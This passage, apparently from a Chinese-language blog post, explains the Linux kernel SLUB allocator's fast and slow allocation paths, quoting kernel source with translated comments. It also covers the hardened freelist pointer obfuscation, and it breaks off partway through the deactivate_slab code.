class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 必须通过该 cpu ptr 读取 kmem_cache cpu 数据. 抢占是开启的.</span><br><span class="hljs-comment"> * 我们可能会在从一个 cpu 区域读取时在 cpu 间切换.</span><br><span class="hljs-comment"> * 只要我们在 cmpxchg 时在原本的 cpu 上重新结束便不要紧.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们必须保证 tid 与 kmem_cache_cpu 被在同一 cpu 上取回.</span><br><span class="hljs-comment"> * 我们首先读取 kmem_cache_cpu 指针并用其读取 tid.</span><br><span class="hljs-comment"> * 若我们在两次读取间被抢占并切换到另一 cpu，由于这两者仍与同一 cpu 关联，</span><br><span class="hljs-comment"> * cmpxchg 稍后将会验证 cpu ，这是 OK 的.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处使用的无中断（irqless） 对象分配/释放算法决定于获取 cpu_slab 数据的顺序.</span><br><span class="hljs-comment"> * tid 应当在在 c 上的任何事之前被获取以确保与此前 tid 关联的对象与 slab</span><br><span class="hljs-comment"> * 不会被与当前 tid 一起使用. 若我们先获取 tid，对象与 slab 可能会与下一个 tid </span><br><span class="hljs-comment"> * 相关联，而我们的分配/释放请求也将会失败.这种情况下我们会重试所以没问题.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queue（这句翻成中文咋都不顺，直接看原文吧😄）.</span><br><span class="hljs-comment"> * 由此可以确保 cmpxchg_double 发生在正确的处理器上且其间在链表上没有任何操作.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>若有 freelist &amp; slub，则<strong>调用 <code>get_freepointer_safe()</code> 获取当前空闲对象下一个空闲对象</strong>；接下来 <code>this_cpu_cmpxchg_double()</code> 会检查是否 <code>freelist == object</code>、<code>cpu_slab-&gt;tid == tid</code>，若是则<strong>将 freelist 设为 next_object 并获取设置下一 tid</strong>，否则说明发生了抢占（我们已经不在原 cpu 上了），跳转回 <code>redo</code> 重新在当前 cpu 上进行分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅当没有额外操作且我们在正确的处理器上时 cmpxchg 将匹配.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg 原子地进行了如下： (没有锁语义!)</span><br><span class="hljs-comment"> * 1. 重定位第一个指针到当前的 per cpu 区域.</span><br><span class="hljs-comment"> * 2. 验证 tid &amp; freelist 没有被改变</span><br><span class="hljs-comment"> * 3. 若未被改变，替换 tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 自从没有锁语义，保护仅需要对抗在该 cpu 上执行的代码*不*从其他的 cpu 上访问.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后对于直接从 cpu_slab 上分配的对象会通过 <code>prefetch_freepointer()</code> 调用 prefetchw 指令提前将已分配对象的地址载入缓存中，之后就是返回分配成功的空闲对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-：获取另一-slab-进行分配（slow-path）"><a href="#II-slab-alloc-：获取另一-slab-进行分配（slow-path）" class="headerlink" title="II. ___slab_alloc()：获取另一 slab 进行分配（slow path）"></a>II. ___slab_alloc()：获取另一 slab 进行分配（slow path）</h3><p><code>__slab_alloc()</code> 其实是在开启了抢占的情况下（默认开启）对 <code>___slab_alloc()</code> 的一个简单的 wrapper，主要就是重新读取 <code>kmem_cache_cpu</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当抢占没有关闭时 ___slab_alloc() 用于上下文的 wrapper.</span><br><span class="hljs-comment"> * 通过重新获取 percpu 区域的指针来补偿可能的 cpu 更改.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们可能已被抢占且在关闭抢占前调度到了不同的 cpu 上.</span><br><span class="hljs-comment"> * 需要重新载入 cpu 区域指针.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看 <code>___slab_alloc()</code>，该函数便是慢速分配路径的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢速路径. 无锁 freelist 为空或是我们需要进行调试任务.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若新的对象已经被释放到常规的 freelist 上，则过程仍是很快的.</span><br><span class="hljs-comment"> * 这种情况下我们简单地让常规的 freelist 取代无锁 freelist</span><br><span class="hljs-comment"> * 并 zap the regular freelist.（zap想不出咋翻译好😄）</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若这不起作用，则我们回退到 partial 链表. 我们将 freelist 上的第一个元素</span><br><span class="hljs-comment"> * 作为要分配的对象并将 freelist 的剩余部分移动到无锁 freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若我们无法从 partial slab 链表上获得一个新的 slab，我们需要分配一个新的 slab.</span><br><span class="hljs-comment"> * 因为这包含对页分配器的调用与新 slab 的设置，这是最慢的路径.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当我们知道抢占被禁用时所用的 __slab_alloc 的版本 (也是造成大量分配的原因).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>接下来笔者按照代码标签顺序进行分析</p><h4 id="①-reread-slab：读取-percpu-slab"><a href="#①-reread-slab：读取-percpu-slab" class="headerlink" title="① reread_slab：读取 percpu slab"></a>① reread_slab：读取 percpu slab</h4><p>首先读取 percpu 的 slab，若没有 slab 则判断分配节点，并跳转到 <code>new_slab</code> 分配新的 slab，注意这一块代码对应 <code>reread_slab</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 node 未上线或没有 normal memory，忽略 node 约束</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-redo：获取-percpu-slab-gt-freelist"><a href="#②-redo：获取-percpu-slab-gt-freelist" class="headerlink" title="② redo：获取 percpu slab-&gt;freelist"></a>② redo：获取 percpu slab-&gt;freelist</h4><p>接下来这块代码对应 <code>redo</code> 标签：</p><ul><li><p>若 percpu slab 不为空，判断 slab 是否属于指定的节点且与分配标志位匹配，若否，则跳转到 <code>deactivate_slab</code> 标签</p></li><li><p>接下来检查 slab 是否仍为原来的 cpu slab（因为我们可能被抢占），若否，则跳转回 <code>reread_slab</code></p></li><li><p>接下来获取 per-cpu 的 freelist，若不为空，则跳转到 <code>load_freelist</code>，否则<strong>调用 <code>get_freelist()</code> 获取 slab 的 freelist</strong></p></li><li><p>若 slab 的 freelist 仍为空，将 per-cpu freelist 设为 NULL，获取下一个 tid，并跳转到 <code>new_slab</code> 分配新的 slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 与上面相同但 node_match() 为 false 则早已说明 node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们理应搜索一个 PFMEMALLOC 的 slab 页面，但现在，</span><br><span class="hljs-comment"> * 当页面离开 per-cpu 分配器，我们正在失去 pfmemalloc 信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* 必须再次检查 c-&gt;slab 以免我们被抢占使其发生了更改 */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> 函数主要就是获取 <code>slab-&gt;freelist</code> 后将 <code>slab-&gt;freelist</code> 设为 NULL 并返回原来的 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查 slab-&gt;freelist 并将 freelist 传送给 percpu freelist</span><br><span class="hljs-comment"> * 或是将 slab 给 deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若返回值非 NULL 则 slab 仍被冻结.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若该函数返回 NULL 则 slab 被解冻.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="③-load-freelist：从-freelist-分配对象"><a href="#③-load-freelist：从-freelist-分配对象" class="headerlink" title="③ load_freelist：从 freelist 分配对象"></a>③ load_freelist：从 freelist 分配对象</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>load_freelist</code> 标签，主要就是调用 <code>get_freepointer()</code> 将 percpu freelist 指向第二个空闲对象，并获取下一个 tid 后返回前面获取的 freelist（也就是第一个空闲对象）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist 指向要被使用的对象链表. slab 指向获得对象的 slab.</span><br><span class="hljs-comment"> * 因此 slab 必须被冻结以让 percpu 的分配正常工作.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>这里注意在 <code>get_freepointer()</code> 里套了两层，最后会调用到 <code>freelist_ptr()</code> 获取到第二个空闲对象的指针，这里需要注意的是当开启了 Hardened freelist 保护后在 next 指针的位置存放的是 <strong>第一个空闲对象地址 ^ 第二个空闲对象地址 ^ 一个随机值</strong>（<code>kmem_cache-&gt;random</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 返回 freelist 指针 (ptr). 在有加固的情况下其通过一个</span><br><span class="hljs-comment"> * 对存储指针的地址与 per-cache 随机值的异或进行混淆.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当开启了 CONFIG_KASAN_SW/HW_TAGS, ptr_addr 可能被打上标签.</span><br><span class="hljs-comment"> * 通常这不会造成任何问题，因为 set_freepointer() 与 get_freepointer() </span><br><span class="hljs-comment"> * 调用时都会有标签相同的指针.</span><br><span class="hljs-comment"> * 但是 CONFIG_SLUB_DEBUG 的代码有些问题. 例如当 __free_slub() 在</span><br><span class="hljs-comment"> * 一个 cache 中迭代对象时,其将没有标签的指针传给 check_object(). </span><br><span class="hljs-comment"> * check_object() 依次带着一个没有标签的指针调用 get_freepointer()，</span><br><span class="hljs-comment"> * 从而造成 freepointer 存储错误.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>从这里我们也可以看出 <strong>slab-&gt;freelist 是没有加密的，但链表上的后续指针都是加密了的</strong></p><h4 id="④-deactivate-slab：deactivate-percpu-slab"><a href="#④-deactivate-slab：deactivate-percpu-slab" class="headerlink" title="④ deactivate_slab：deactivate percpu slab"></a>④ deactivate_slab：deactivate percpu slab</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>deactivate_slab</code> 标签，首先还是惯例地检查是否被抢占调度到了别的 CPU，若是则跳转回 <code>reread_slab</code>；之后就是简单地将 percpu 的 slab 和 freelist 设为 NULL 并获取下一个 tid，之后调用 <code>deactivate_slab()</code> 将这张 slab 给 deactivate 了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> 的逻辑如下：</p><ul><li>遍历 freelist 检查是否被破坏，放弃被破坏的部分</li><li>将 <code>slab-&gt;freelist</code> 设为原 <code>kmem_cache_cpu-&gt;freelist</code>，若 slab 上原有 freelist 不为 NULL 则再接到后面</li><li>设置 slab 的 counters，其中<strong>将 <code>frozen</code> 设为 0</strong></li><li>若 slab 上的对象全部空闲**且 node 的 partial slab 数量大于 <code>kmem_cache-&gt;min_partial</code>**，调用 <code>discard_slab()</code> 将 slab 释放</li><li>若 slab 上存在空闲对象，调用 <code>add_partial()</code> 将其加入 node 的 partial 链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 结束移除 cpu slab. 合并 cpu&#x27;s freelist 与 slab&#x27;s freelist,</span><br><span class="hljs-comment"> * 解冻 slabs 并放在合适的链表上.</span><br><span class="hljs-comment"> * 假设 slab 已经被调用者安全地从 kmem_cache_cpu 上取下.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span 